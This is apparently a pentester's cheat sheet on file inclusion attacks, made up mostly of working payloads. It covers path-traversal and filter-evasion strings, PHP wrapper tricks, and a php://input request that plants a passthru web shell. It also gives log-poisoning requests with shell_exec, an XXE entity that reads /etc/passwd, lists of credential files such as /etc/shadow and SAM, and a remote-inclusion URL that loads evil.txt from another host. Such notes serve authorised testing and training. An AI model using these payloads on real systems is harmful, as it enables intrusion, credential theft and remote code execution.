# Local File Inclusion (LFI) and Remote File Inclusion (RFI)
#
# definitely read all of this guide:
# https://www.onsecurity.io/blog/file-upload-checklist/
#
# another good one:
# [good htb guide](https://academy.hackthebox.com/module/details/23)

# REMEMBER: almost all RFI are also LFI
# REMEMBER: LFI can become RCE if you can a) read-in files/blobs
#           b) containing user input data (ie. malicious code to be interpreted)

# https://cobalt.io/blog/a-pentesters-guide-to-file-inclusion

# Path traversal
# - NUL byte `%00` (php parses, c extensions do not) can dodge suffixes like +cat'.php'
# - `../` and permutations
#  - urlencode `%2e%2e%2f` bypasses php app str_replace logic but executes with c extension
#  - bash expansion `.?/.*/.?/etc/passwd` ie. app filtering before `system()` and `exec()` call
#  - dodge single str replace invocation `....//`.replace('../','') => `../` 

# PHP-specific:
# wrappers: php:// data:// expect:// input:// zip://
#   php://filter  ie.
#     php://filter/read=/resource=/etc/passwd
#     php://filter/read=convert.base64-encode/resource=config.php

# php://expect/id

POST /index.php?page=php://input&cmd=whoami HTTP/1.0
Content-Length: 32

<?php passthru($_GET['cmd']); ?>



# General:
#   `ftp://` http:// https:// etc.
#   SMB!!! `\\1.2.3.4\evil.php` because it's not considered a protocol; no security controls
# writable log files: nginx/apache, `/var/lib/php/sessions/sess_7tlifda45s1ih0at285rd59scr`
#   2nd software log files: ssh, vsftpd, mail
# malicious file extensions ie. `evil.php.jpg`

# also XML format allows DTD specifying External Entities which can be file references!
# ie. in a dynamic http server that accepts various request content-types
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<email>&company;</email>
```
# where the email param is somehow reflected back to you ie. 
# - in a templated response, or
# - error ie. "invalid input <reflected input>", or 
# - in OOB exfiltration via DNS name or HTTP path
# likewise, if its a php xml parser, thenthe php-specific wrappers can be used in place of file://


# LFI Linux Files:
/proc/self/environ
/etc/issue
/proc/version
/etc/profile
/etc/passwd
/etc/passwd
/etc/shadow
/root/.bash_history
/var/log/dmessage
/var/mail/root
/var/spool/cron/crontabs/root

# LFI Windows Files:
%SYSTEMROOT%/repair/system
%SYSTEMROOT%/repair/SAM
%SYSTEMROOT%/repair/SAM
%WINDIR%/win.ini
%SYSTEMDRIVE%/boot.ini
%WINDIR%/Panther/sysprep.inf
%WINDIR%/system32/config/AppEvent.Evt

# LFI OSX Files:
/etc/fstab
/etc/master.passwd
/etc/resolv.conf
/etc/sudoers
/etc/sysctl.conf

# LFI - Download passwords file
http://$ip/a.php?page=/etc/passwd
http://$ip/a.php?file=../../../../etc/passwd

# LFI - Download passwords file with filter evasion
http://$ip/a.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd

# Local File Inclusion - In versions of PHP below 5.3 we can terminate with null byte
GET /a.php?name=b&comment=c&LANG=../../../../../../../windows/system32/drivers/etc/hosts%00

# Contaminating Log Files
GET <?php echo shell_exec($_GET['cmd']);?> HTTP/1.0

# For a Remote File Inclusion look for php code that is not
# sanitized and passed to the PHP include function and the php.ini
# file must be configured to allow remote files:
# php.ini `allow_url_fopen` and `allow_url_include` both set to `on`
include($_REQUEST["file"].".php");

# Remote File Inclusion
http://192.168.11.35/addguestbook.php?name=a&comment=b&LANG=http://192.168.10.5/evil.txt
<?php echo shell_exec("ipconfig");?>

